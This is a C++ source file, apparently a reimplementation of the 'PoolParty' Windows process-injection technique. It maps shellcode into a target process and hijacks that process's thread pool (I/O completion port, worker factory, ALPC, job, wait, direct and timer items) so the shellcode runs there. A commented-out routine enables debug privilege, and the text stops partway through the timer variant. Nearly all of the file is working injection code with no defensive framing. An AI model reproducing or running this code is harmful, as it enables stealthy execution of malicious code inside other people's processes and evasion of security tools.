#include "PoolStruct.h"

using namespace std;

HMODULE hNTDLL = GetModuleHandleA("ntdll");
NtCreateSection pNtCreateSection = (NtCreateSection)(GetProcAddress(hNTDLL, "NtCreateSection"));
NtMapViewOfSection pNtMapViewOfSection = (NtMapViewOfSection)(GetProcAddress(hNTDLL, "NtMapViewOfSection"));
NtUnmapViewOfSection pNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(hNTDLL, "NtUnmapViewOfSection"));
NtQueryInformationWorkerFactory pNtQueryInformationWorkerFactory = (NtQueryInformationWorkerFactory)(GetProcAddress(hNTDLL, "NtQueryInformationWorkerFactory"));
NtSetInformationWorkerFactory pNtSetInformationWorkerFactory = (NtSetInformationWorkerFactory)(GetProcAddress(hNTDLL, "NtSetInformationWorkerFactory"));
NtWriteVirtualMemory pNtWriteVirtualMemory = (NtWriteVirtualMemory)(GetProcAddress(hNTDLL, "NtWriteVirtualMemory"));
NtAssociateWaitCompletionPacket pNtAssociateWaitCompletionPacket = (NtAssociateWaitCompletionPacket)(GetProcAddress(hNTDLL, "NtAssociateWaitCompletionPacket"));
NtSetInformationFile pNtSetInformationFile = (NtSetInformationFile)(GetProcAddress(hNTDLL, "NtSetInformationFile"));
NtAlpcCreatePort pNtAlpcCreatePort = (NtAlpcCreatePort)(GetProcAddress(hNTDLL, "NtAlpcCreatePort"));
TpAllocAlpcCompletion pTpAllocAlpcCompletion = (TpAllocAlpcCompletion)(GetProcAddress(hNTDLL, "TpAllocAlpcCompletion"));
NtAlpcSetInformation pNtAlpcSetInformation = (NtAlpcSetInformation)(GetProcAddress(hNTDLL, "NtAlpcSetInformation"));
NtAlpcConnectPort pNtAlpcConnectPort = (NtAlpcConnectPort)(GetProcAddress(hNTDLL, "NtAlpcConnectPort"));
TpAllocJobNotification pTpAllocJobNotification = (TpAllocJobNotification)(GetProcAddress(hNTDLL, "TpAllocJobNotification"));
NtSetIoCompletion pNtSetIoCompletion = (NtSetIoCompletion)(GetProcAddress(hNTDLL, "NtSetIoCompletion"));
NtSetTimer2 pNtSetTimer2 = (NtSetTimer2)(GetProcAddress(hNTDLL, "NtSetTimer2"));

PVOID ShellcodeInject(HANDLE hProcess, unsigned char* shellcode, SIZE_T shellcodesize) {
	//SIZE_T shellcodesize = sizeof(shellcode);
	LARGE_INTEGER SectionSize = { shellcodesize };
	HANDLE SectionHandle = NULL;
	PVOID LocalSectionAddress = NULL, RemoteSectionAddress = NULL;

	if (pNtCreateSection(&SectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&SectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) != STATUS_SUCCESS) {
		cout << "[x]Create Section Failed." << endl;
		return NULL;
	}
	if (pNtMapViewOfSection(SectionHandle, GetCurrentProcess(), &LocalSectionAddress, NULL, NULL, NULL, &shellcodesize, 2, NULL, PAGE_EXECUTE_READWRITE) != STATUS_SUCCESS) {
		cout << "[x]Local MapSection Failed" << endl;
        CloseHandle(SectionHandle);
		return NULL;
	}
	if (pNtMapViewOfSection(SectionHandle, hProcess, &RemoteSectionAddress, NULL, NULL, NULL, &shellcodesize, 2, NULL, PAGE_EXECUTE_READWRITE) != STATUS_SUCCESS) {
		cout << "[x]Remote MapSection Failed" << endl;
        CloseHandle(SectionHandle);
		return NULL;
	}

	memcpy(LocalSectionAddress, shellcode, shellcodesize);
	cout << "[!]Shellcode injected into 0x" << hex << (DWORD64)RemoteSectionAddress << endl;

	CloseHandle(SectionHandle);
	return RemoteSectionAddress;
}

/*
BOOL AdjustToken() {
    std::cout << "[0]Adjust Process Token for Injection." << std::endl;
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "OpenProcessToken failed. Error: " << GetLastError() << "\n";
        return FALSE;
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        std::cerr << "LookupPrivilegeValue failed. Error: " << GetLastError() << "\n";
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Adjust token privileges to enable SeDebugPrivilege
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        std::cerr << "AdjustTokenPrivileges failed. Error: " << GetLastError() << "\n";
        CloseHandle(hToken);
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::cerr << "The token does not have SeDebugPrivilege.\n";
        CloseHandle(hToken);
        return FALSE;
    }
    std::cout << "[+]Success!" << std::endl;
    CloseHandle(hToken);
    return TRUE;
}
*/

HANDLE HijackThreadPoolRelatedHandle(wstring ObjectType, HANDLE hProcess, DWORD dwDesiredAccess) {
    std::cout << "[O]Try to duplicate Host Process Handle" << std::endl;
    std::cout << "[+]Enumerate Process Handles..." << std::endl;
    ULONG BufSize = 0x10000;
    PVOID Buffer = NULL;
    NTSTATUS st = STATUS_INFO_LENGTH_MISMATCH;
    do {
        free(Buffer);
        Buffer = malloc(BufSize);
        if (!Buffer) {
            cerr << "[-]MemAlloc for Handle Failed." << endl;
            CloseHandle(hProcess);
            return NULL;
        }
        st = NtQueryInformationProcess(hProcess, (_PROCESSINFOCLASS)ProcessHandleInformation, Buffer, BufSize, &BufSize);
        BufSize <<= 1;
    } while (st == STATUS_INFO_LENGTH_MISMATCH);
    if (!NT_SUCCESS(st)) {
        cerr << "[-]NtQueryProcessInformation Failed with NTSTATUS code 0x" << hex << st << endl;
        free(Buffer);
        CloseHandle(hProcess);
        return NULL;
    }
    auto hProcTableInfo = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)Buffer;
    cout << "[+]ProcessHandles are " << hProcTableInfo->NumberOfHandles << endl;
    HANDLE hThreadPoolObject = NULL;
    //PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation;
    for (ULONG i = 0; i < hProcTableInfo->NumberOfHandles; i++) {
        HANDLE dup = NULL;
        if (!DuplicateHandle(hProcess, hProcTableInfo->Handles[i].HandleValue, GetCurrentProcess(), &dup, dwDesiredAccess, FALSE, DUPLICATE_SAME_ACCESS)) {
            std::cout << "[-]Cannot Duplicate Handles " << GetLastError() << std::endl;
            continue;
        }
        ULONG Needed = 0;
        NTSTATUS BufGetStat = NtQueryObject(dup, ObjectTypeInformation, NULL, 0, &Needed);
        if (BufGetStat != STATUS_INFO_LENGTH_MISMATCH) {
            CloseHandle(dup);
            continue;
        }
        auto typeBuf = (BYTE*)malloc(Needed);
        if (!typeBuf) {
            CloseHandle(dup);
            continue;
        }
        NTSTATUS Objst = NtQueryObject(dup, ObjectTypeInformation, typeBuf, Needed, &Needed);
        if (!NT_SUCCESS(Objst)) {
            free(typeBuf);
            CloseHandle(dup);
            continue;
        }
        auto pType = (PPUBLIC_OBJECT_TYPE_INFORMATION)typeBuf;
        std::wstring Name(pType->TypeName.Buffer, pType->TypeName.Length / sizeof(wchar_t));
        free(typeBuf);
        if (Name == ObjectType) {
            hThreadPoolObject = dup;
            break;
        }
        CloseHandle(dup);
    }
    free(Buffer);
    return hThreadPoolObject;
}

//Success
BOOL TpWaitInsert(PVOID shellcodeaddress, HANDLE hProcess, HANDLE hIoCompletion) {
    auto pTpWait = (PFULL_TP_WAIT)CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeaddress, NULL, NULL);//FULL_TP_WAIT?
    if (pTpWait == NULL) {
        cerr << "[-]Failed to create TpWait" << GetLastError << endl;
        return FALSE;
    }
    cout << "[+]Created Associated TP_WAIT with shellcode" << endl;
    HANDLE hTpWaitSection = NULL;
    PVOID LocalTpWaitAddress = NULL, RemoteTpWaitAddress = NULL;
    SIZE_T TpWaitSize = sizeof(FULL_TP_WAIT);
    LARGE_INTEGER TpWaitSectionSize = { sizeof(FULL_TP_WAIT) };
    NTSTATUS CreateSectionForRemoteTpWaitStatus = pNtCreateSection(&hTpWaitSection, SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &TpWaitSectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(CreateSectionForRemoteTpWaitStatus)) {
        cerr << "[-]Failed to create section for TpWait 0x" << hex << CreateSectionForRemoteTpWaitStatus << endl;
        free(pTpWait);
        return FALSE;
    }
    NTSTATUS LocalMapStat = pNtMapViewOfSection(hTpWaitSection, GetCurrentProcess(), &LocalTpWaitAddress, NULL, NULL, NULL, &TpWaitSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(LocalMapStat)) {
        cerr << "[-]Failed to Map TpWait Section in Local Process 0x" << hex << LocalMapStat << endl;
        free(pTpWait);
        CloseHandle(hTpWaitSection);
        return FALSE;
    }
    NTSTATUS RemoteMapStat = pNtMapViewOfSection(hTpWaitSection, hProcess, &RemoteTpWaitAddress, NULL, NULL, NULL, &TpWaitSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(RemoteMapStat)) {
        cerr << "[-]Failed to Map TpWait Section in Remote Process 0x" << hex << RemoteMapStat << endl;
        free(pTpWait);
        CloseHandle(hTpWaitSection);
        return FALSE;
    }
    memcpy(LocalTpWaitAddress, pTpWait, TpWaitSize);
    cout << "[+]Write Crafted TP_WAIT structure to host process success!" << endl;
    CloseHandle(hTpWaitSection);

    HANDLE hTpDirectSection = NULL;
    PVOID LocalTpDirectAddress = NULL, RemoteTpDirectAddress = NULL;
    SIZE_T TpDirectSize = sizeof(TP_DIRECT);
    LARGE_INTEGER TpDirectSectionSize = { sizeof(TP_DIRECT) };
    NTSTATUS CreateSectionForRemoteTpDirectStatus = pNtCreateSection(&hTpDirectSection, SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &TpDirectSectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(CreateSectionForRemoteTpDirectStatus)) {
        cerr << "[-]Failed to create section for TpDirect 0x" << hex << CreateSectionForRemoteTpDirectStatus << endl;
        free(pTpWait);
        return FALSE;
    }
    NTSTATUS LocalMapStatus = pNtMapViewOfSection(hTpDirectSection, GetCurrentProcess(), &LocalTpDirectAddress, NULL, NULL, NULL, &TpDirectSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(LocalMapStatus)) {
        cerr << "[-]Failed to map TpDirect section in Local Process 0x" << hex << LocalMapStatus << endl;
        free(pTpWait);
        CloseHandle(hTpDirectSection);
        return FALSE;
    }
    NTSTATUS RemoteMapStatus = pNtMapViewOfSection(hTpDirectSection, hProcess, &RemoteTpDirectAddress, NULL, NULL, NULL, &TpDirectSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(RemoteMapStatus)) {
        cerr << "[-]Failed to map TpDirect section in Remote Process 0x" << hex << RemoteMapStatus << endl;
        free(pTpWait);
        CloseHandle(hTpDirectSection);
        return FALSE;
    }
    memcpy(LocalTpDirectAddress, &pTpWait->Direct, sizeof(TP_DIRECT));
    cout << "[+]Write TpDirect to target process." << endl;
    CloseHandle(hTpDirectSection);

    HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, L"PoolPartyEvent");
    if (hEvent == NULL) {
        cerr << "[-]Failed to create event." << GetLastError() << endl;
        free(pTpWait);
        return FALSE;
    }
    wcout << "[+]Create PoolParty Event Name " << L"PoolPartyEvent" << endl;

    NTSTATUS AssociateEventStatus = pNtAssociateWaitCompletionPacket(pTpWait->WaitPkt, hIoCompletion, hEvent, RemoteTpDirectAddress, RemoteTpWaitAddress, 0, 0, NULL);
    if (!NT_SUCCESS(AssociateEventStatus)) {
        cerr << "[-]Failed to Associate Event with IO completion port of target process 0x" << hex << AssociateEventStatus << endl;
        CloseHandle(hEvent);
        free(pTpWait);
        return FALSE;
    }
    cout << "[+]Associated event with the IO completion port of the target process worker factory." << endl;

    SetEvent(hEvent);
    cout << "[+]Set event to queue a packet to the IO completion port of the target process worker factory." << endl;
    CloseHandle(hEvent);
    free(pTpWait);
    return TRUE;
}

//success
BOOL TpIoInsert(PVOID shellcodeaddress, HANDLE hProcess, HANDLE hIoCompletion) {
    auto hFile = CreateFile(L"PoolTemp.txt", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
    if (hFile == NULL) {
        cerr << "[-]Failed to create PoolParty temp file "<< GetLastError() << endl;
        return FALSE;
    }
    cout << "[+]Create Poolparty temp file success." << endl;

    auto pTpIo = (PFULL_TP_IO)CreateThreadpoolIo(hFile, (PTP_WIN32_IO_CALLBACK)shellcodeaddress, NULL, NULL);
    if (pTpIo == NULL) {
        cerr << "[-]Failed to Create TpIo " << GetLastError() << endl;
        CloseHandle(hFile);
        return FALSE;
    }
    cout << "[+]Assiociated to shellcode TpIo Created!" << endl;

    pTpIo->CleanupGroupMember.Callback = shellcodeaddress;
    ++pTpIo->PendingIrpCount;
    cout << "[+]Started async IO operation within the TP_IO." << endl;

    HANDLE hTpIoSection = NULL;
    SIZE_T TpIoSize = sizeof(FULL_TP_IO);
    LARGE_INTEGER TpIoSectionSize = { sizeof(FULL_TP_IO) };
    PVOID LocalTpIoAddress = NULL, RemoteTpIoAddress = NULL;
    NTSTATUS TpIoSectionCreationStatus = pNtCreateSection(&hTpIoSection, SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &TpIoSectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(TpIoSectionCreationStatus)) {
        cerr << "[-]Failed to create shared section for TpIo 0x" << hex << TpIoSectionCreationStatus << endl;
        free(pTpIo);
        CloseHandle(hFile);
        return FALSE;
    }
    NTSTATUS LocalTpIoStatus = pNtMapViewOfSection(hTpIoSection, GetCurrentProcess(), &LocalTpIoAddress, NULL, NULL, NULL, &TpIoSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(LocalTpIoStatus)) {
        cerr << "[-]Failed Map TpIO in local process 0x" << hex << LocalTpIoStatus << endl;
        CloseHandle(hTpIoSection);
        free(pTpIo);
        CloseHandle(hFile);
        return FALSE;
    }
    NTSTATUS RemoteTpIoStatus = pNtMapViewOfSection(hTpIoSection, hProcess, &RemoteTpIoAddress, NULL, NULL, NULL, &TpIoSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(RemoteTpIoStatus)) {
        cerr << "[-]Failed Map TpIO in remote process 0x" << hex << RemoteTpIoStatus << endl;
        CloseHandle(hTpIoSection);
        free(pTpIo);
        CloseHandle(hFile);
        return FALSE;
    }
    memcpy(LocalTpIoAddress, pTpIo, sizeof(FULL_TP_IO));
    cout << "[+]Mapped Crafted TP_IO Structure to target process." << endl;
    CloseHandle(hTpIoSection);

    IO_STATUS_BLOCK IoStatusBlock{ 0 };
    FILE_COMPLETION_INFORMATION FileIoCopmletionInformation{ 0 };
    PFULL_TP_IO pRemoteTpIo = (PFULL_TP_IO)RemoteTpIoAddress; //Attention here.
    FileIoCopmletionInformation.Port = hIoCompletion;
    FileIoCopmletionInformation.Key = &pRemoteTpIo->Direct;
    NTSTATUS st = pNtSetInformationFile(hFile, &IoStatusBlock, &FileIoCopmletionInformation, sizeof(FILE_COMPLETION_INFORMATION), (FILE_INFORMATION_CLASS)FileReplaceCompletionInformation);
    if (!NT_SUCCESS(st)) {
        cerr << "[-]Failed to associate file with io completion port of target worker factory 0x" << hex << st << endl;
        free(pTpIo);
        CloseHandle(hFile);
        return FALSE;
    }
    const string str = "Thanks for Madobe Mio, Chihaya Anon, Togawa Sakiko, Takamatsu Tomori and others' help.\nSayonara.";
    const auto strlength = str.length();
    OVERLAPPED Overlapped{ 0 };
    if (!WriteFile(hFile, str.c_str(), strlength, NULL, &Overlapped)) {
        if (&Overlapped) {
            if (GetLastError() == ERROR_IO_PENDING) {
                cout << "[+]File Overlapped but operate success." << endl;
                free(pTpIo);
                CloseHandle(hFile);
                return TRUE;
            }
            cerr << "[-]WriteFile failed to trigger execute, error: " << GetLastError() << endl;
            free(pTpIo);
            CloseHandle(hFile);
            return FALSE;
        }
        cerr << "[-]WriteFile failed to trigger execute, error: " << GetLastError() << endl;
        free(pTpIo);
        CloseHandle(hFile);
        return FALSE;
    }
    cout << "[+]Operate Complete." << endl;
    free(pTpIo);
    CloseHandle(hFile);
    return TRUE;
}

//Success
BOOL TpAlpcInsert(PVOID shellcodeaddress, HANDLE hProcess, HANDLE hIoCompletion) {
    HANDLE hAlpc = NULL;
    NTSTATUS hAlpcSt = pNtAlpcCreatePort(&hAlpc, NULL, NULL);
    if (!NT_SUCCESS(hAlpcSt)) {
        cerr << "[-]Failed to Create Temp ALPC Port with 0x" << hex << hAlpcSt << endl;
        return FALSE;
    }
    cout << "[+]Success Create Temp ALPC Port " << hAlpc << endl;

    PFULL_TP_ALPC pTpAlpc = { 0 };//
    NTSTATUS pTpAllocAlpcSt = pTpAllocAlpcCompletion(&pTpAlpc, hAlpc, (PTP_ALPC_CALLBACK)shellcodeaddress, NULL, NULL);
    if (!NT_SUCCESS(pTpAllocAlpcSt)) {
        cerr << "[-]Failed to allocate ALPC Completion 0x" << hex << pTpAllocAlpcSt << endl;
        CloseHandle(hAlpc);
        return FALSE;
    }
    cout << "[+]Allocate ALPC Completion SUCCESS." << endl;

    UNICODE_STRING AlpcPortName = INIT_UNICODE_STRING(L"\\RPC Control\\PoolMapAlpcPort");
    OBJECT_ATTRIBUTES AlpcObjectAttributes = { 0 };//
    AlpcObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    AlpcObjectAttributes.ObjectName = &AlpcPortName;

    ALPC_PORT_ATTRIBUTES AlpcPortAttributes = { 0 };
    AlpcPortAttributes.Flags = 0x20000;
    AlpcPortAttributes.MaxMessageLength = 328;

    HANDLE hAlpcConnection = NULL;
    NTSTATUS hConAlpcSt = pNtAlpcCreatePort(&hAlpcConnection, &AlpcObjectAttributes, &AlpcPortAttributes);
    if (!NT_SUCCESS(hConAlpcSt)) {
        cerr << "[-]Failed to create Connect ALPC Port 0x" << hConAlpcSt << endl;
        free(pTpAlpc);
        CloseHandle(hAlpc);
        return FALSE;
    }
    cout << "[+]Create ALPC Port for Connection success " << hAlpcConnection << endl;

    HANDLE hTpAlpcSection = NULL;
    SIZE_T TpAlpcSize = sizeof(FULL_TP_ALPC);
    LARGE_INTEGER TpAlpcSectionSize = { sizeof(FULL_TP_ALPC) };
    PVOID LocalTpAlpcAddress = NULL, RemoteTpAlpcAddress = NULL;
    NTSTATUS TpAlpcSectionSt = pNtCreateSection(&hTpAlpcSection, SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &TpAlpcSectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(TpAlpcSectionSt)) {
        cerr << "[-]Failed to Create Section for TpAlpc 0x" << hex << TpAlpcSectionSt << endl;
        CloseHandle(hAlpcConnection);
        free(pTpAlpc);
        CloseHandle(hAlpc);
        return FALSE;
    }
    NTSTATUS LocalTpAlpcSt = pNtMapViewOfSection(hTpAlpcSection, GetCurrentProcess(), &LocalTpAlpcAddress, NULL, NULL, NULL, &TpAlpcSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(LocalTpAlpcSt)) {
        cerr << "[-]Failed to Map local section 0x" << hex << LocalTpAlpcSt << endl;
        CloseHandle(hTpAlpcSection);
        CloseHandle(hAlpcConnection);
        free(pTpAlpc);
        CloseHandle(hAlpc);
        return FALSE;
    }
    NTSTATUS RemoteTpAlpcSt = pNtMapViewOfSection(hTpAlpcSection, hProcess, &RemoteTpAlpcAddress, NULL, NULL, NULL, &TpAlpcSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(RemoteTpAlpcSt)) {
        cerr << "[-]Failed to map remote TpAlpc section 0x" << hex << RemoteTpAlpcSt << endl;
        CloseHandle(hTpAlpcSection);
        CloseHandle(hAlpcConnection);
        free(pTpAlpc);
        CloseHandle(hAlpc);
        return FALSE;
    }
    memcpy(LocalTpAlpcAddress, pTpAlpc, TpAlpcSize);
    cout << "[+]TpAlpc written to 0x" << hex << RemoteTpAlpcAddress << " Success!" << endl;
    CloseHandle(hTpAlpcSection);

    ALPC_PORT_ASSOCIATE_COMPLETION_PORT AlpcPortAssociateCopmletionPort = { 0 };
    AlpcPortAssociateCopmletionPort.CompletionKey = RemoteTpAlpcAddress;
    AlpcPortAssociateCopmletionPort.CompletionPort = hIoCompletion;
    NTSTATUS StAlpcSetInfo = pNtAlpcSetInformation(hAlpcConnection, AlpcAssociateCompletionPortInformation, &AlpcPortAssociateCopmletionPort, sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT));
    if (!NT_SUCCESS(StAlpcSetInfo)) {
        cerr << "[-]Failed to associated ALPC port with IO completion port of host process. 0x" << hex << StAlpcSetInfo << endl;
        CloseHandle(hAlpcConnection);
        free(pTpAlpc);
        CloseHandle(hAlpc);
        return FALSE;
    }

    OBJECT_ATTRIBUTES AlpcClientObjectAttributes = { 0 };
    AlpcClientObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    string Buffer = "Madobe Mio calling to the tardet pool, waiting for the answer from the specific fool.";
    auto BufferLength = Buffer.length();

    ALPC_MESSAGE ClientAlpcPortMessage = { 0 };
    ClientAlpcPortMessage.PortHeader.u1.s1.DataLength = BufferLength;
    ClientAlpcPortMessage.PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + BufferLength;
    std::copy(Buffer.begin(), Buffer.end(), ClientAlpcPortMessage.PortMessage);
    auto szClientAlpcPortMessage = sizeof(ClientAlpcPortMessage);

    LARGE_INTEGER liTimeout{ 0 };
    liTimeout.QuadPart = -10000000;

    HANDLE hAlpc2 = NULL;
    NTSTATUS StConnectPort = pNtAlpcConnectPort(&hAlpc2, &AlpcPortName, &AlpcClientObjectAttributes, &AlpcPortAttributes, 0x20000, NULL, (PPORT_MESSAGE)&ClientAlpcPortMessage, &szClientAlpcPortMessage, NULL, NULL, &liTimeout);
    cout << "[+]Connect Port to Queue a packet to the IO completion port of target process 0x" << hex << StConnectPort << endl;
    CloseHandle(hAlpcConnection);
    free(pTpAlpc);
    CloseHandle(hAlpc);
    return TRUE;
}

//Success
BOOL TpJobInsert(PVOID shellcodeaddress, HANDLE hProcess, HANDLE hIoCompletion) {
    HANDLE hJob = CreateJobObject(NULL, L"PoolMapJob");
    if (hJob == NULL) {
        cerr << "[-]Failed to create job." << endl;
        return FALSE;
    }
    cout << "[+]Create Job Object with Name PoolMapJob" << endl;

    PFULL_TP_JOB pTpJob = { 0 };
    NTSTATUS pTpJobSt = pTpAllocJobNotification(&pTpJob, hJob, shellcodeaddress, NULL, NULL);
    if (!NT_SUCCESS(pTpJobSt)) {
        cerr << "[-]Failed to Allocate TpJobNotification 0x" << hex << pTpJobSt << endl;
        CloseHandle(hJob);
        return FALSE;
    }
    cout << "[+]Create TP_JOB associated with the shellcode." << endl;

    HANDLE hTpJobSection = NULL;
    SIZE_T TpJobSize = sizeof(FULL_TP_JOB);
    LARGE_INTEGER TpJobSectionSize = { sizeof(FULL_TP_JOB) };
    PVOID LocalTpJobAddress = NULL, RemoteTpJobAddress = NULL;
    NTSTATUS TpJobSecSt = pNtCreateSection(&hTpJobSection, SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &TpJobSectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(TpJobSecSt)) {
        cerr << "[-]Failed to Create Section for TpJob 0x" << hex << TpJobSecSt << endl;
        free(pTpJob);
        CloseHandle(hJob);
        return FALSE;
    }
    NTSTATUS LocalTpJobSt = pNtMapViewOfSection(hTpJobSection, GetCurrentProcess(), &LocalTpJobAddress, NULL, NULL, NULL, &TpJobSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(LocalTpJobSt)) {
        cerr << "[-]Failed to map Local TP_JOB 0x" << hex << LocalTpJobSt << endl;
        CloseHandle(hTpJobSection);
        free(pTpJob);
        CloseHandle(hJob);
        return FALSE;
    }
    NTSTATUS RemoteTpJobSt = pNtMapViewOfSection(hTpJobSection, hProcess, &RemoteTpJobAddress, NULL, NULL, NULL, &TpJobSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(RemoteTpJobSt)) {
        cerr << "[-]Failed to map Remote TP_JOB 0x" << hex << RemoteTpJobSt << endl;
        CloseHandle(hTpJobSection);
        free(pTpJob);
        CloseHandle(hJob);
        return FALSE;
    }
    memcpy(LocalTpJobAddress, pTpJob, TpJobSize);
    cout << "[+]TpJob write to 0x" << hex << RemoteTpJobAddress << endl;
    CloseHandle(hTpJobSection);

    JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCopmletionPort = { 0 };
    SetInformationJobObject(hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
    cout << "[!]Zeroed out job object IO completion port." << endl;
    JobAssociateCopmletionPort.CompletionKey = RemoteTpJobAddress;
    JobAssociateCopmletionPort.CompletionPort = hIoCompletion;
    SetInformationJobObject(hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
    cout << "[!]Associated Job Object with the IO Completion Port." << endl;
    AssignProcessToJobObject(hJob, GetCurrentProcess());
    cout << "[!]Assigned current process to job object to queue a packet to the target process IO Completion Port." << endl;
    
    free(pTpJob);
    CloseHandle(hJob);
    return TRUE;
}

//success
BOOL TpDirectInsert(PVOID shellcodeaddress, HANDLE hProcess, HANDLE hIoCompletion) {
    TP_DIRECT TpDirect = { 0 };
    TpDirect.Callback = shellcodeaddress;
    cout << "[O]Crafted TpDirect Structure Associated with the shellcode." << endl;

    HANDLE hTpDirectSection = NULL;
    SIZE_T TpDirectSize = sizeof(TP_DIRECT);
    LARGE_INTEGER TpDirectSectionSize = { sizeof(TP_DIRECT) };
    PVOID LocalTpDirectAddress = NULL, RemoteTpDirectAddress = NULL;
    NTSTATUS TpDirectSecSt = pNtCreateSection(&hTpDirectSection, SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &TpDirectSectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(TpDirectSecSt)) {
        cerr << "[-]Failed to create section for TpDirect 0x" << hex << TpDirectSecSt << endl;
        return FALSE;
    }
    NTSTATUS LocalTpDirectMapSt = pNtMapViewOfSection(hTpDirectSection, GetCurrentProcess(), &LocalTpDirectAddress, NULL, NULL, NULL, &TpDirectSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(LocalTpDirectMapSt)) {
        cerr << "[-]Failed to Map Local TpDirect 0x" << hex << LocalTpDirectMapSt << endl;
        CloseHandle(hTpDirectSection);
        return FALSE;
    }
    NTSTATUS RemoteTpDirectMapSt = pNtMapViewOfSection(hTpDirectSection, hProcess, &RemoteTpDirectAddress, NULL, NULL, NULL, &TpDirectSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(RemoteTpDirectMapSt)) {
        cerr << "[-]Failed to Map Remote TpDirect 0x" << hex << RemoteTpDirectMapSt << endl;
        CloseHandle(hTpDirectSection);
        return FALSE;
    }
    memcpy(LocalTpDirectAddress, &TpDirect, sizeof(TP_DIRECT));
    cout << "[+]Mapped TpDirect to Target Process." << RemoteTpDirectAddress << endl;
    CloseHandle(hTpDirectSection);

    NTSTATUS SetIoCompletionSt = pNtSetIoCompletion(hIoCompletion, RemoteTpDirectAddress, NULL, NULL, NULL);
    if (!NT_SUCCESS(SetIoCompletionSt)) {
        cerr << "[-]Failed to queue the packet to IO completion port 0x" << hex << SetIoCompletionSt << endl;
        return FALSE;
    }
    cout << "[+]Queue a packet to IO Completion Port" << endl;
    return TRUE;
}

//success
BOOL TpTimerInsert(PVOID shellcodeaddress, HANDLE hProcess, HANDLE hWorkerFactory, HANDLE hIRTimer) {
    WORKER_FACTORY_BASIC_INFORMATION WorkerBasicInfo = { 0 };
    NTSTATUS GetWorkerFactoryBasicInfoSt = pNtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &WorkerBasicInfo, sizeof(WorkerBasicInfo), NULL);
    if (!NT_SUCCESS(GetWorkerFactoryBasicInfoSt)) {
        cerr << "[-]Failed to retrieve worker factory basic information." << hex << GetWorkerFactoryBasicInfoSt << endl;
        return FALSE;
    }
    auto pTpTimer = (PFULL_TP_TIMER)CreateThreadpoolTimer((PTP_TIMER_CALLBACK)shellcodeaddress, NULL, NULL);
    if (pTpTimer == NULL) {
        cerr << "[-]Failed to Create Thread Pool Timer " << GetLastError() << endl;
        return FALSE;
    }
    cout << "[+]Create TpTimer associated with the shellcode." << endl;

    //Due to the problem mentioned in the original PoolParty problem, Allocate>perform changes>write, hope this can work.
    HANDLE hTpTimerSection = NULL;
    SIZE_T TpTimerSize = sizeof(FULL_TP_TIMER);
    LARGE_INTEGER TpTimerSectionSize = { sizeof(FULL_TP_TIMER) };
    PVOID LocalTpTimerAddress = NULL, RemoteTpTimerAddress = NULL;
    NTSTATUS StTpTimerCreate = pNtCreateSection(&hTpTimerSection, SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &TpTimerSectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
